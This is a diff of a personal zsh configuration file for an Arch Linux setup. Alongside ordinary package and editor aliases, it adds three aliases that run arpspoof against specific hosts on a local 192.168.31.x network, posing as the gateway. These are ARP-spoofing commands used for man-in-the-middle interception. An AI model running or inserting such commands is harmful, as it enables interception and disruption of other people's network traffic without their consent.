@@ -112,9 +112,11 @@ alias reb='reboot'
 alias po='poweroff'
 alias trash='sudo pacman -R $(pacman -Qdtq)'
 alias trash2='sudo pacman -Scc'
-alias update='yay -Syu'
-alias updatef='yay -Syyu'
 alias vim='nvim'
+alias cfg='cd ~/Documents/archcfg/'
+alias a125='sudo arpspoof -i wlan0 -t 192.168.31.125 192.168.31.1'
+alias a196='sudo arpspoof -i wlan0 -t 192.168.31.196 192.168.31.1'
+alias a197='sudo arpspoof -i wlan0 -t 192.168.31.197 192.168.31.1'
 export PATH=~/.local/bin:$PATH
 
 ZSH_CACHE_DIR=$HOME/.cache/oh-my-zsh
